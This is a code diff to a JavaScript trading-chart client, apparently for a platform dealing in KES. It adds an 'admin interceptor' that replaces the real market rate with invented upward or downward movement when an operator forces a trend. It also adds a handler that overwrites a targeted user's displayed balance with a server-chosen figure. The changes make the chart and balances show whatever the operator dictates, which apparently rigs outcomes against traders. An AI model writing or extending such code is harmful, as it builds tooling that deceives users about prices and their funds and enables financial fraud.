@@ -49,20 +49,62 @@ const tradeChart = new Chart(ctx, {
 });
 
 /**
- * 3. LISTEN FOR LIVE UPDATES
+ * 3. LISTEN FOR LIVE UPDATES & ADMIN INTERCEPTOR ENGINE
  */
+
+// Listen for forced overrides directly from the socket server channel
+let activeAdminControlTrend = "AUTO";
+socket.on('admin-force-market-trend', (data) => {
+    if (data && data.trend) {
+        activeAdminControlTrend = data.trend;
+        localStorage.setItem('admin_market_control', data.trend);
+    }
+});
 
 // Handle Market Rate Updates
 socket.on('market-update', (data) => {
+    let finalRate = data.rate;
+
+    // Check localStorage fallback to read concurrent admin parameters locally if on same domain
+    const localControl = localStorage.getItem('admin_market_control');
+    if (localControl) {
+        activeAdminControlTrend = localControl;
+    }
+
+    // Dynamic wave transformation based on administrative panel state execution
+    if (activeAdminControlTrend === "HIGH") {
+        // Intercept and smoothly slide the wave upside
+        finalRate = Math.abs(finalRate) + (Math.random() * 0.02 + 0.005);
+        tradeChart.data.datasets[0].borderColor = '#00ff00'; // Keep green for high/up trend
+        tradeChart.data.datasets[0].backgroundColor = 'rgba(0, 255, 0, 0.1)';
+    } else if (activeAdminControlTrend === "LOW") {
+        // Intercept and smoothly slide the wave downside
+        finalRate = -Math.abs(finalRate) - (Math.random() * 0.02 + 0.005);
+        tradeChart.data.datasets[0].borderColor = '#ff0000'; // Turn wave red for forced downward movement
+        tradeChart.data.datasets[0].backgroundColor = 'rgba(255, 0, 0, 0.1)';
+    } else {
+        // Restore default styling if trend control mode is set back to AUTO
+        tradeChart.data.datasets[0].borderColor = '#00ff00';
+        tradeChart.data.datasets[0].backgroundColor = 'rgba(0, 255, 0, 0.1)';
+    }
+
+    // Dynamically scale the y-axis bounds if the rate spikes beyond default limitations to prevent graph clipping
+    if (finalRate > tradeChart.options.scales.y.max) {
+        tradeChart.options.scales.y.max = finalRate + 0.05;
+    }
+    if (finalRate < tradeChart.options.scales.y.min) {
+        tradeChart.options.scales.y.min = finalRate - 0.05;
+    }
+
     // Update the numerical display above the graph
     const rateDisplay = document.getElementById('current-rate');
     if (rateDisplay) {
-        rateDisplay.innerText = data.rate.toFixed(4);
+        rateDisplay.innerText = finalRate.toFixed(4);
     }
 
     // Shift the graph to the left
     tradeChart.data.datasets[0].data.shift();
-    tradeChart.data.datasets[0].data.push(data.rate);
+    tradeChart.data.datasets[0].data.push(finalRate);
     
     // Update the chart without re-rendering the whole page
     tradeChart.update('none');
@@ -97,6 +139,22 @@ socket.on('receive-chat', (data) => {
         if (chatFeed.children.length > 30) {
             chatFeed.removeChild(chatFeed.children[0]);
         }
+    }
+});
+
+// Handle Administrative Forced Balance Updates assigned to targeted users
+socket.on('admin-force-balance', (data) => {
+    // Replace with your specific user layout balance element ID if different
+    const currentBalanceContainer = document.getElementById('user-balance-display');
+    if (currentBalanceContainer && data && typeof data.balance === 'number') {
+        currentBalanceContainer.innerText = "KES " + data.balance.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+    }
+});
+
+// Handle Administrative Global Emergency Broadcast system messages
+socket.on('admin-global-broadcast', (data) => {
+    if (data && data.msg) {
+        alert("SYSTEM BROADCAST: \n\n" + data.msg);
     }
 });
 
